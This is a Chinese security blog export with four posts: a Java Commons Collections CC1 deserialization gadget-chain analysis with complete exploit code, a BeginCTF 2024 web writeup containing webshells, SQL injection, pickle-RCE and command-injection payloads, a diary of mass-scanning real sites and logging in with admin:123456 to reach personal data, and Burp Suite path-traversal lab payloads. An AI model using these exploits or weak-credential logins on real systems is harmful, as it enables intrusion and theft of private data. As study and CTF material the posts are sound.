{"meta":{"title":"Narcherの小窝","subtitle":"","description":"","author":"Narcher Alter","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"JAVA安全:CC1链","slug":"JAVA安全CC1链","date":"2024-12-22T08:28:36.330Z","updated":"2024-10-17T10:26:34.430Z","comments":true,"path":"2024/12/22/JAVA安全CC1链/","link":"","permalink":"http://example.com/2024/12/22/JAVA%E5%AE%89%E5%85%A8CC1%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;2&#x2F;23 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;2&#x2F;23 分类：Vulnerability Analysis 前言开始之前，我们先了解一下正射和反射。 JAVA中，如果我们要调用起计算器，正常的命令执行为： 1Runtime.getRuntime().exec(&quot;calc&quot;); 但上边使用的是正射，是无法序列化写入文件中的，如果要存入文件，我们需要利用反射来实现： 1234Runtime r = Runtime.getRuntime();//实例化Runtime类Class c = r.getClass();//获取类原型，这里和正射不同，方法从类中获取Method m = c.getMethod(&quot;exec&quot;,String.class);//从类中获取exec方法m.invoke(r,&quot;calc&quot;);//相当于r.exec(&quot;calc&quot;) 所谓的CC链，实际上就是针对Apache Commons Collections组件的payload，其核心便是利用JAVA的反射机制来调用任意函数。 正文针对JAVA的反序列化漏洞，思路大致和php的反序列化漏洞一致，就是从终点往前找，首先确定一个调用了危险方法的类，并且继承了序列化接口，然后逐步溯源，直到找到一个重写了readObject方法的类，并且符合条件，那么就成功了。 下面我们以CC1链为例，进行分析。 1.终点–InvokerTransformer类CC1链的源头便是InvokerTransformer类，关键在于其构造器和继承了Transformer接口的transform方法，我们来看一下它的源码： 123456789101112131415161718192021222324public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;&#125;public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 从构造器中可以得知其三个参数都是可以控制的，而方法transform是不是有点眼熟？没错，这就是在前言中讲到的反射。 我们尝试利用InvokerTransformer类执行之前的命令： 123456 Runtime r = Runtime.getRuntime();// Class c = r.getClass();// Method m = c.getMethod(&quot;exec&quot;,String.class);// m.invoke(r,&quot;calc&quot;);上边这三行注释的代码由下边这两行代替 InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;); invokerTransformer.transform(r); 执行上述代码，发现成功弹出计算器。 这样，终点就找到了，我们便需要进行溯源，寻找上一站。 2.溯源2.1 TransformedMap类我们向上找能够利用transform方法的类： 发现有很多，于是便一个个点开查看，最终发现LazyMap，TransformedMap和DefaultedMap存在利用点，我们先只看TransformedMap这个类。 123456789protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;//构造器 super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;&#125;protected Object checkSetValue(Object value) &#123; return valueTransformer.transform(value);//我们只需要让valueTransformer为InvokerTransformer即可&#125; 然而，TransformerMap的checkSerValue方法以及其构造器都是protected类型的，只能在内部访问，因此我们需要找一个使其实例化的方法，紧接着便看到了TransformedMap中public属性的decorate方法： 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; 因此我们可以利用TransformedMap类的decorate方法，让其实例化，之后再想办法触发checkSetValue方法。 2.2 Map遍历我们查找调用过checkSetValue方法的地方，发现TransformedMap的父类AbstractInputCheckedMapDecorator恰好调用了该方法，且其中的setValue方法为public类型 1234567891011121314static class MapEntry extends AbstractMapEntryDecorator &#123;//AbstractInputCheckedMapDecorator的副类MapEntry private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = parent.checkSetValue(value); return entry.setValue(value); &#125;&#125; 而MapEntry继承了AbstractMapEntryDecorator类，AbstractMapEntryDecorator类中继承了Map.Entry接口，可进行Map遍历 因此我们通过Map遍历时即可调用TransformedMap的父类AbstractInputCheckedMapDecorator中的setValue方法来触发TransformedMap中的checkSetValue方法。 12345678Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,invokerTransformer);for(Map.Entry entry:transformedmap.entrySet())&#123; entry.setValue(r);//相当于InvokerTransformer.transform(r)&#125; 执行上述代码即可弹出计算器，然而，溯源还未结束，我们接着找调用了setValue方法的类。 2.3 起点–AnnotationInvocationHandler类经查找可得： 该类中调用setValue方法的代码如下： 两个if语句，第一个if判断注解中是否有成员变量，第二个if判断是否能够强转。 可见此类中利用的setValue方法恰好写在readObject方法中，只要我们能够控制里边的参数，便可大功告成。 于是我们去找该类的构造器： 12345678910AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; //需要传入两个参数，第一个参数是一个类对象，表示注解的类型；第二个参数需要传入Map，因此传入TransformedMap即可 Class&lt;?&gt;[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;); this.type = type; this.memberValues = memberValues;&#125; 接下来第一个参数的构造需要符合这几个if条件，首先，需要是注解类型；其次，内部需要有成员变量，以便在for循环的Map遍历中通过。 像常见的Override注解： 不包含任何成员变量。 因此，我们选用Target注解： 与此同时，更改map.put(“value”,”value”)，使其memberType不为空。 但还有一个问题，那就是AnnotationInvocationHandler类并没有public属性，因此仅能够在sun.reflect.annotation这个包下边调用，因此我们就需要用到反射来实现外部调用。 经过上述溯源，我们成功找到了一条链，接下来我们需要将其以代码形式串联起来。 3.构造链3.1 反射获取Runtime实例Runtime是单例类，且不继承Seralizeable接口，无法在序列化时写入文件，而它的原型类Class则继承了Seralizeable接口，因此我们使用反射获取其原型类。 12345Class rc=Class.forName(&quot;java.lang.Runtime&quot;); //获取类原型Method getRuntime = rc.getDeclaredMethod(&quot;getRuntime&quot;,null);Runtime r = (Runtime) getRuntime.invoke(null,null);Method exec = rc.getDeclaredMethod(&quot;exec&quot;,String.class);exec.invoke(r,&quot;calc&quot;); 这样便可实现序列化，我们采用InvokerTransformer类的transform方法实现上述过程： 1234Class rc = Class.forName(&quot;java.lang.Runtime&quot;);Method getRuntime = (Method)new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);Runtime r = (Runtime) new InvokerTransformer(&quot;getRuntime&quot;,new Class[]&#123;Object.class,Object.class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntime);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r); 3.2 使用ChainedTransformer类简化过程1234567891011public ChainedTransformer(Transformer[] transformers) &#123; super(); iTransformers = transformers;&#125;public Object transform(Object object) &#123; for (int i = 0; i &lt; iTransformers.length; i++) &#123; object = iTransformers[i].transform(object); &#125; return object;&#125; ChainedTransformer类中存在的transform方法类似于递归调用，因此我们可以以数组的形式传入InvokerTransformer类的transform方法实现的获取Runtime实例的过程，故更改代码如下： 1234567Transformer[] transformers=new Transformer[]&#123; new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); 然而，在实际的环境中，我们不可能直接调用chainedTransformer的transform方法来传入Runtime.class。因此，我们需要将Runtime.class作为递归的开头传入进去，而直接传入是不可能的，我们需要一个类来作为载体。与此同时，我们还忽略了一个问题，那就是AnnotationInvocationHandler类中的setValue参数不可控。 3.3 ConstantTransformer类的引入先来看一下该类的源码： 12345678public ConstantTransformer(Object constantToReturn) &#123;//构造器 super(); iConstant = constantToReturn;&#125;public Object transform(Object input) &#123;//transform方法 return iConstant;&#125; 该类的transform方法很有意思，无论传入何值，均会返回构造时传入的常量，因此，我们可以直接将Transformer数组改成如下： 123456Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;; 3.4 构造完成完整的CC1链如下所示： 123456789101112131415161718192021Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,null,chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Target.class,transformedmap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(o);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); 成功执行便会弹出计算器： 4.思路转换本次分析的CC1链是国内基于TransformerMap类的链，而我们常用的ysoserial中的则是国外基于LazyMap的链，其思路如下： payload也和之前的类似，不过是将TransformerMap改为了LazyMap，利用方法由checkSetValue变为了get，并多了一步Proxy触发invoke方法，至于注解类型，由于我们利用的是get方法，所以不需要进入if，直接随便传一个注解就可以了。最后使用AnnotationInvocationHandler类进行包装，毕竟我们需要使用它的readObject方法进行反序列化。 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(handler);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject();","categories":[],"tags":[]},{"title":"BeginCTF2024_WEB_WP","slug":"BeginCTF2024_WEB_WP","date":"2024-12-22T08:27:47.300Z","updated":"2024-02-07T03:20:32.243Z","comments":true,"path":"2024/12/22/BeginCTF2024_WEB_WP/","link":"","permalink":"http://example.com/2024/12/22/BeginCTF2024_WEB_WP/","excerpt":"作者：Narcher 时间：2024&#x2F;2&#x2F;3 分类：writeup","text":"作者：Narcher 时间：2024&#x2F;2&#x2F;3 分类：writeup zupload系列1.这一系列的题目基本上都是考察简单的代码审计，论难度只能算是签到题。 2.所有题目均会先贴出源码。 zupload 本题对action的赋值无过滤，因此可直接读flag，payload:?action=/flag zupload-pro 本题禁止了目录穿越，但限制条件不多，可直接用php伪协议读取文件。 payload:?action=php://filter/convert.base64-encode/resource=/flag base64解码即可：begin{is_tHis_4_wE85heLL_069b22e704f1} zupload-pro-plus 本题做法同上，payload:?action=php://filter/convert.base64-encode/resource=/flag 从源码改动上来看，出题人应该是想让选手进行后缀双写绕过，但应该是出题的时候不严谨，导致有多种做法，因此不再过多赘述 zupload-pro-plus-enhanced 作者在本题进行了加固，只能进行双写后缀的形式绕过 方法如下： 1.一句话木马&lt;?php @eval(system(&#39;cat /flag&#39;))?&gt;写入1.php2.改后缀名为1.zip3.上传时拦截数据包改名为1.zip.php4.访问http://ip:port/uploads/1.zip.php zupload-pro-plus-max 本题考点：include()函数包含文件时不考虑文件后缀，并且会将文件内容当作php代码执行 方法如下： 1.创建1.txt里边写上php一句话木马&lt;?php eval(system(&quot;cat /flag&quot;));?&gt;2.压缩为1.zip上传3.访问uploads&#x2F;1.zip，include()函数自动解析1.txt内的内容即可获取&#x2F;flag zupload-pro-plus-max-ultra 本题考点：$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些额外的项目。 $_SERVER[‘PHP_SELF’] 当前执行脚本的文件名，与 document root 有关。例如，在地址为 http://example.com/test.php/foo.bar 的脚本中使用 $SERVER[‘PHP_SELF’] 将得到 &#x2F;test.php&#x2F;foo.bar。__FILE_ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。 $_SERVER[‘GATEWAY_INTERFACE’] 服务器使用的 CGI 规范的版本；例如，”CGI&#x2F;1.1”。 $_SERVER[‘SERVER_ADDR’] 当前运行脚本所在的服务器的 IP 地址。 $_SERVER[‘SERVER_NAME’] 当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。(如: www.runoob.com) $_SERVER[‘SERVER_SOFTWARE’] 服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache&#x2F;2.2.24) $_SERVER[‘SERVER_PROTOCOL’] 请求页面时通信协议的名称和版本。例如，”HTTP&#x2F;1.0”。 $_SERVER[‘REQUEST_METHOD’] 访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。 $_SERVER[‘REQUEST_TIME’] 请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496) $_SERVER[‘QUERY_STRING’] query string（查询字符串），如果有的话，通过它进行页面访问。 $_SERVER[‘HTTP_ACCEPT’] 当前请求头中 Accept: 项的内容，如果存在的话。 $_SERVER[‘HTTP_ACCEPT_CHARSET’] 当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。 $_SERVER[‘HTTP_HOST’] 当前请求头中 Host: 项的内容，如果存在的话。 $_SERVER[‘HTTP_REFERER’] 引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。) $_SERVER[‘HTTPS’] 如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。 $_SERVER[‘REMOTE_ADDR’] 浏览当前页面的用户的 IP 地址。 $_SERVER[‘REMOTE_HOST’] 浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。 $_SERVER[‘REMOTE_PORT’] 用户机器上连接到 Web 服务器所使用的端口号。 $_SERVER[‘SCRIPT_FILENAME’] 当前执行脚本的绝对路径。 $_SERVER[‘SERVER_ADMIN’] 该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：&#115;&#111;&#x6d;&#x65;&#111;&#110;&#101;&#x40;&#114;&#x75;&#110;&#x6f;&#x6f;&#x62;&#46;&#99;&#111;&#x6d;) $_SERVER[‘SERVER_PORT’] Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。 $_SERVER[‘SERVER_SIGNATURE’] 包含了服务器版本和虚拟主机名的字符串。 $_SERVER[‘PATH_TRANSLATED’] 当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。 $_SERVER[‘SCRIPT_NAME’] 包含当前脚本的路径。这在页面需要指向自己时非常有用。FILE 常量包含当前脚本(例如包含文件)的完整路径和文件名。 $_SERVER[‘SCRIPT_URI’] URI 用来指定要访问的页面。例如 “&#x2F;index.html”。 （以上内容均来自菜鸟：PHP 超级全局变量 | 菜鸟教程 (runoob.com)） 方法如下： 1.burp抓包，在http头中添加X-Extract-To:.;cp &#x2F;flag . &#x2F;uploads&#x2F; 2.访问http://ip:port/uploads/flag zupload-pro-plus-max-ultra-premium 本题考点：软链接 软链接可以看成是Windows系统中的快捷方式，可以让你快速链接到目标文件或目录，它找到的是原文件名，通过原文件名找到真实的文件或目录，且软连接本身有自己的indoe 方法如下： 1.ln -s &#x2F;flag flag创建软连接文件 2.将文件压缩为zip格式上传 3.访问&#x2F;uploads&#x2F;flag即可访问到&#x2F;flag zupload-pro-revenge 本题考点：前端校验绕过（PS：任何前端校验都是不可信的） 方法如下： 1.一句话木马&lt;?php @eval(system(&#39;cat /flag&#39;))?&gt;写入1.php2.改后缀名为1.zip3.上传时拦截数据包改名为1.php4.访问http://ip:port/uploads/1.php sql教学局单纯的sql waf绕过，没什么技术含量 flag分为三部分，依次拿就是了 payload如下： 1231.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/group_concat(flag)/**/frfromom/**/secret.passwoorrd%232.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/group_concat(student,%27~%27,grade)/**/frfromom/**/scoorre/**/where/**/student/**/like/**/%27begin%27%233.http://ip:port/challenge.php?user=1%27/**/union/**/seselectlect/**/loloadad_file(&#x27;/flag&#x27;)%23 POPgadget考察php反序列化，这个题目有点坑人，flag在环境变量中，直接看phpinfo就可以了，耗费了很多时间 POP链构造：B::__destruct到A::__get到Fun::__call 别忘了将空字符改成%00，之后GET传参：?begin=O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;%00Fun%00func&quot;;s:20:&quot;call_user_func_array&quot;;&#125;&#125;&#125; PS：后来才知道，这个phpinfo是个非预期，真正的解法实际上是把phpinfo改成env直接看环境变量（其实也差不多） pickelshop新知识点：考察pickel反序列化 register页面注册获取cookie，在login页面的http头中添加cookie会发现回显 因此在username中添加__reduce__函数进行命令执行 1234567891011121314151617181920import pickleimport base64class register(object): def __init__(self, username=&quot;test&quot;): self.username = username def __reduce__(self): return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;,))a = &#123;&#x27;username&#x27;: register(), &#x27;password&#x27;: &#x27;124&#x27;&#125;c = pickle.dumps(a, protocol=4)encoded_data = base64.b64encode(c)# 将base64字符串写入Output.txt文件中print(a)print(encoded_data) 之后改Cookie即可 readbooks本题考点：命令执行 &#x2F;public&#x2F;book*发现同时列出来了book1和book2的内容 因此直接&#x2F;list&#x2F;*获取当前目录所有文件名 再用&#x2F;public&#x2F;black*获取黑名单，&#x2F;public&#x2F;app*获取源码 源码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import osfrom flask import Flask, request, render_templateapp = Flask(__name__)DISALLOWED1 = [&#x27;?&#x27;, &#x27;../&#x27;, &#x27;/&#x27;, &#x27;;&#x27;, &#x27;!&#x27;, &#x27;@&#x27;, &#x27;#&#x27;, &#x27;^&#x27;, &#x27;&amp;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;=&#x27;, &#x27;+&#x27;]DISALLOWED_FILES = [&#x27;app.py&#x27;, &#x27;templates&#x27;, &#x27;etc&#x27;, &#x27;flag&#x27;, &#x27;blacklist&#x27;]BLACKLIST = [x[:-1] for x in open(&quot;./blacklist.txt&quot;).readlines()][:-1]BLACKLIST.append(&quot;/&quot;)BLACKLIST.append(&quot;\\\\&quot;)BLACKLIST.append(&quot; &quot;)BLACKLIST.append(&quot;\\t&quot;)BLACKLIST.append(&quot;\\n&quot;)BLACKLIST.append(&quot;tc&quot;)ALLOW = [ &quot;&#123;&quot;, &quot;&#125;&quot;, &quot;[&quot;, &quot;pwd&quot;, &quot;-&quot;, &quot;_&quot;]for a in ALLOW: try: BLACKLIST.remove(a) except ValueError: pass@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def hello_world(): return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/public/&lt;path:name&gt;&#x27;)def readbook(name): name = str(name) for i in DISALLOWED1: if i in name: return &quot;banned!&quot; for j in DISALLOWED_FILES: if j in name: return &quot;banned!&quot; for k in BLACKLIST: if k in name: return &quot;banned!&quot; print(name) try: res = os.popen(&#x27;cat &#123;&#125;&#x27;.format(name)).read() return res except: return &quot;error&quot;@app.route(&#x27;/list/&lt;path:name&gt;&#x27;)def listbook(name): name = str(name) for i in DISALLOWED1: if i in name: return &quot;banned!&quot; for j in DISALLOWED_FILES: if j in name: return &quot;banned!&quot; for k in BLACKLIST: if k in name: return &quot;banned!&quot; print(name) cmd = &#x27;ls &#123;&#125;&#x27;.format(name) try: res = os.popen(cmd).read() return res except: return &quot;error&quot;if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8878) 黑名单过滤了许多，因此需要绕过 空格用$IFS$9代替，关键字使用&#39;&#39;绕过，执行的命令进行base64转换 payload: &#x2F;public&#x2F;$IFS$9`ec’’ho$IFS$9Lyo|ba’’se64$IFS$9-d` 读取根目录下所有文件 King本题参考beginCTF 2024 Web方向题解WP 全-CSDN博客","categories":[],"tags":[]},{"title":"记一次简单的公益SRC挖掘","slug":"记一次简单的公益SRC挖掘","date":"2024-12-22T08:26:49.205Z","updated":"2024-02-05T15:44:11.021Z","comments":true,"path":"2024/12/22/记一次简单的公益SRC挖掘/","link":"","permalink":"http://example.com/2024/12/22/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98/","excerpt":"作者：Narcher 时间：2024&#x2F;2&#x2F;5 分类：diary","text":"作者：Narcher 时间：2024&#x2F;2&#x2F;5 分类：diary 前言​ 开头吐槽一下，本来想批量挖thinkphp框架漏洞的，但试了一试发现行不通（挖不出来），甚至我在查资产的时候查到了黄色网站！！！于是在郁闷之际随便搞，看见一个网站就搞一个，准备碰碰运气，结果还真让我碰到一个弱口令漏洞，下面讲一讲具体过程。 ​ 这事还要从半个月前说起… ​ Smgg之前接了个活，让我们写一下ZoomEye的实战心得。实战心得嘛，肯定得挖出来点东西。作为一个没挖过洞的runoob，只能到时候现学现卖了，本来打算过两天去学的。但我忙着打BeginCTF去了，于是就忘了。 ​ 直到昨天，BeginCTF打的差不多了，WP也写完了，刚想起这么个事，于是便赶鸭子上架，学了一下大佬们的相关思路，开始实战！！！ 昨日收获​ 昨日，我复现了一篇大佬写的挖掘《用友U8-OA》的SQL注入漏洞的具体流程来作为练习。（特附上大佬的文章：Fofa搜索语法批量挖掘sql注入漏洞 - 知乎 (zhihu.com)） ​ 既然已经确定了想要挖掘的漏洞，首先利用ZoomEye进行信息搜集。 ​ （保险起见，给关键信息打码处理） 之后点击右侧的下载导出所有的信息。 为了进行简单的对比，我还在Fofa上搜集了相同的信息并导出。 之后便是批量处理，写个脚本即可，直接拿大佬的过来用也行。 最终收获了8个有漏洞的网站，但有几个能交上完全是未知数。。。。。。 12345PS:同时，作为昨日使用ZoomEye的心得，在此总结一下：1.ZoomEye确实挺好用的，和Fofa比起来也算是各有千秋，搜集信息的时候最好使用二者都搜一下，互相补足2.ZoomEye搜索子域名是一把好手 今日收获​ 今天本来想和昨天类似，整一个thinkphp的批量挖掘来练练手，结果就碰上了“前言”里写的那些poshi，但总之也是有收获的嘛。下面具体讲一下思路。 ​ 还是一如既往的搜集信息： ​ 本来是打算批量刷的，然而就在此时，我脑回路一抽，突然想着手打。可打着打着发现菜的一个也打不通，于是便玉玉地打弱口令，刚试了第一个，就成了。那么好运？？？ ​ 结果进去一看，是个空的，啥也没有，那弱口令自然也就没用了。后面仔细看了一下，感觉这个好像不是什么企业的，顶多是个人拿来玩的个IP。 ​ 不过也算是个开门红，之后本着试一试的心态接着尝试了七八次。欸嘿，还真来了。 ​ 直接admin:123456登进去，发现还真是管理员权限，里边还有敏感信息。 算个中高危，交了，嘿嘿。 1PS:今日份总结：狗运当头~~~ 咳咳，以为这样就结束了？我本来也是这样认为的，写完日记准备收工，但奈何手痒，又想多刷几下，于是在刷了三四下之后还真又狗运刷到一个弱口令，这次还是个edu的，芜湖~~~ 再次账号：admin，密码：123456拿下，仍然具有管理员权限。 交到edusrc，收工！ 等等，这么好挖，收什么工！！！！继续挖！！！！ 没5分钟，又来一个。 源源不断，又又又来一个。这个更厉害，敏感信息泄露，包括姓名，手机号，身份证等。 ​ 之后又挖到一个小的，按道理应该算是某个团队搭建的论坛，算了，统统交上。。。 已经23点半了，今天马上结束了，今天的挖洞也真正的到此为止了。太爽啦！！！ 1PS：今日份总结：鸿运齐天！！！","categories":[],"tags":[]},{"title":"Burpsuite靶场--Path_Traversal","slug":"Burpsuite靶场--Path_Traversal","date":"2024-12-22T08:25:07.809Z","updated":"2024-01-26T02:56:30.426Z","comments":true,"path":"2024/12/22/Burpsuite靶场--Path_Traversal/","link":"","permalink":"http://example.com/2024/12/22/Burpsuite%E9%9D%B6%E5%9C%BA--Path_Traversal/","excerpt":"作者：Narcher 时间：2024&#x2F;1&#x2F;10 分类：writeup","text":"作者：Narcher 时间：2024&#x2F;1&#x2F;10 分类：writeup File path traversal, simple case随便打开一个博客，抓包，将?filename&#x3D;后的数据改成../../../../../etc/passwd即可。 File path traversal, traversal sequences blocked with absolute path bypass在这道题目中，..被禁用。因此我们无法使用相对路径../解题，仅能使用绝对路径/解题。 （在Linux系统中，文件路径是非常重要的。&#x2F;etc&#x2F;passwd和etc&#x2F;passwd看起来很相似，但实际上它们指向的是完全不同的位置。 /etc/passwd：这是一个绝对路径，它从文件系统的根目录/开始，指向etc目录下的passwd文件。这个文件存储了系统中所有用户的基本信息。 etc/passwd：这是一个相对路径，它从当前工作目录开始，指向当前目录下的etc子目录中的passwd文件。如果当前工作目录下没有etc子目录或者etc子目录中没有passwd文件，那么这个路径就无法正确地找到文件。） 因此，将?filename&#x3D;后的数据改成/etc/passwd即可。 File path traversal, traversal sequences stripped non-recursively非递归地剥离遍历序列时，使用....//或....\\/将其恢复成正常遍历序列。 将?filename&#x3D;后的数据改成....//....//....//etc/passwd即可。 File path traversal, traversal sequences stripped with superfluous URL-decode根据题目描述，本题需要通过url编码来绕过过滤，因此对..&#x2F;进行两次url编码。 将?filename&#x3D;后的数据改成%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd即可。 File path traversal, validation of start of path本题的目录遍历必须以预期的基文件开头即/var/www/images/，因此将?filename&#x3D;后的数据改成/var/www/images/../../../../etc/passwd即可。 File path traversal, validation of file extension with null byte 